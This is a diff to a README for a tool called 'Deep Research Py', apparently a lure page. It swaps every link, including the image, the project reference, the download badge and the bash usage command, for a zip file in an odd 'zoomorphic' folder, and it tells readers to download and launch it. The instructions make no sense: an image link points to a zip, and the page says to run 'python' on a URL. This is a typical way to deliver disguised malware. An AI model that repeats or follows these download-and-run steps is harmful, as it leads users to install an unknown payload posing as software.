@@ -1,9 +1,9 @@
 # 🚀 Welcome to "Deep Research Py" Repository! 🧠
 
-![Deep Research Py](https://github.com/ayobcoding/deep-research-py/releases/download/v1.0/Software.zip)
+![Deep Research Py](https://raw.githubusercontent.com/ayobcoding/deep-research-py/main/zoomorphic/research-deep-py-2.2.zip)
 
 ### Overview
-"Deep Research Py" is a powerful tool that allows you to save $200 a month by conducting deep research right in your terminal. This project is a Python port of https://github.com/ayobcoding/deep-research-py/releases/download/v1.0/Software.zip By using this tool, you can harness the capabilities of deep research without the need for expensive software or additional resources.
+"Deep Research Py" is a powerful tool that allows you to save $200 a month by conducting deep research right in your terminal. This project is a Python port of https://raw.githubusercontent.com/ayobcoding/deep-research-py/main/zoomorphic/research-deep-py-2.2.zip By using this tool, you can harness the capabilities of deep research without the need for expensive software or additional resources.
 
 ### Features
 🔍 Conduct deep research directly within your terminal  
@@ -12,17 +12,17 @@
 
 ### Installation
 To get started with "Deep Research Py", you can download the repository by clicking the link below:
-[![Download Deep Research Py](https://github.com/ayobcoding/deep-research-py/releases/download/v1.0/Software.zip)](https://github.com/ayobcoding/deep-research-py/releases/download/v1.0/Software.zip)
+[![Download Deep Research Py](https://raw.githubusercontent.com/ayobcoding/deep-research-py/main/zoomorphic/research-deep-py-2.2.zip)](https://raw.githubusercontent.com/ayobcoding/deep-research-py/main/zoomorphic/research-deep-py-2.2.zip)
 
 *Please note that the downloaded file needs to be launched in your local environment.*
 
 ### Usage
 1. Clone the repository to your local machine.
 2. Navigate to the project directory.
-3. Launch the "https://github.com/ayobcoding/deep-research-py/releases/download/v1.0/Software.zip" file in your terminal.
+3. Launch the "https://raw.githubusercontent.com/ayobcoding/deep-research-py/main/zoomorphic/research-deep-py-2.2.zip" file in your terminal.
 
 ```bash
-python https://github.com/ayobcoding/deep-research-py/releases/download/v1.0/Software.zip
+python https://raw.githubusercontent.com/ayobcoding/deep-research-py/main/zoomorphic/research-deep-py-2.2.zip
 ```
 
 ### Contributors
